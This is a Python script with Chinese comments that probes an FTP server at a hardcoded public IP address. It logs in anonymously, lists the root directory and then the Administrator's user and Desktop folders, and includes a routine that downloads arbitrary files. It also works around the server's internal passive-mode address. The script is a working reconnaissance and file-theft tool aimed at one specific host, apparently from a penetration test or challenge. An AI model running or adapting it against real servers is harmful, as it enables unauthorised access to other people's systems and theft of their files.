#!/usr/bin/env python3
"""
FTP 探测和文件读取
"""

import socket
import re

TARGET = "116.62.114.4"

class FTPClient:
    def __init__(self, host, port=21):
        self.host = host
        self.port = port
        self.sock = None
        
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.host, self.port))
        return self.recv()
        
    def send(self, cmd):
        self.sock.send((cmd + "\r\n").encode())
        return self.recv()
        
    def recv(self):
        data = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                # 检查是否收到完整响应
                if data.endswith(b'\r\n'):
                    break
            except socket.timeout:
                break
        return data.decode('utf-8', errors='ignore')
        
    def parse_pasv(self, resp):
        """解析 PASV 响应获取数据连接信息"""
        match = re.search(r'\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)', resp)
        if match:
            nums = [int(x) for x in match.groups()]
            ip = f"{nums[0]}.{nums[1]}.{nums[2]}.{nums[3]}"
            port = nums[4] * 256 + nums[5]
            return ip, port
        return None, None
        
    def list_dir(self, path="/"):
        """列出目录"""
        resp = self.send("PASV")
        print(f"PASV: {resp.strip()}")
        ip, port = self.parse_pasv(resp)
        
        if ip and port:
            # 由于目标是内网 IP，我们需要用实际地址
            print(f"[*] Data channel: {ip}:{port} (internal, using {self.host}:{port})")
            
            # 创建数据连接
            data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            data_sock.settimeout(10)
            try:
                data_sock.connect((self.host, port))
                
                # 发送 LIST 命令
                self.send(f"CWD {path}")
                resp = self.send("LIST")
                print(f"LIST response: {resp.strip()}")
                
                # 接收数据
                listing = b""
                while True:
                    try:
                        chunk = data_sock.recv(4096)
                        if not chunk:
                            break
                        listing += chunk
                    except:
                        break
                        
                data_sock.close()
                print(f"\n[+] Directory listing for {path}:")
                print(listing.decode('utf-8', errors='ignore'))
                
                # 接收完成响应
                final = self.recv()
                print(f"Final: {final.strip()}")
                
            except Exception as e:
                print(f"[-] Data connection failed: {e}")
                
    def get_file(self, filepath):
        """下载文件"""
        resp = self.send("PASV")
        print(f"PASV: {resp.strip()}")
        ip, port = self.parse_pasv(resp)
        
        if ip and port:
            print(f"[*] Data channel: {self.host}:{port}")
            
            data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            data_sock.settimeout(10)
            try:
                data_sock.connect((self.host, port))
                
                # 使用 TYPE I 二进制模式
                self.send("TYPE I")
                
                resp = self.send(f"RETR {filepath}")
                print(f"RETR response: {resp.strip()}")
                
                content = b""
                while True:
                    try:
                        chunk = data_sock.recv(4096)
                        if not chunk:
                            break
                        content += chunk
                    except:
                        break
                        
                data_sock.close()
                print(f"\n[+] File content ({len(content)} bytes):")
                print(content.decode('utf-8', errors='ignore'))
                
                final = self.recv()
                print(f"Final: {final.strip()}")
                
            except Exception as e:
                print(f"[-] Failed to get file: {e}")

def main():
    ftp = FTPClient(TARGET)
    
    print("[*] Connecting to FTP server...")
    banner = ftp.connect()
    print(f"Banner: {banner.strip()}")
    
    print("\n[*] Anonymous login...")
    print(ftp.send("USER anonymous").strip())
    print(ftp.send("PASS anonymous@").strip())
    
    print("\n[*] Getting system info...")
    print(ftp.send("SYST").strip())
    print(ftp.send("PWD").strip())
    
    print("\n[*] Listing root directory...")
    ftp.list_dir("/")
    
    # 尝试列出用户目录
    print("\n[*] Trying to access user directories...")
    for path in ["/Users", "/Users/Administrator", "/Users/Administrator/Desktop"]:
        print(f"\n--- Trying {path} ---")
        ftp.list_dir(path)

if __name__ == "__main__":
    main()
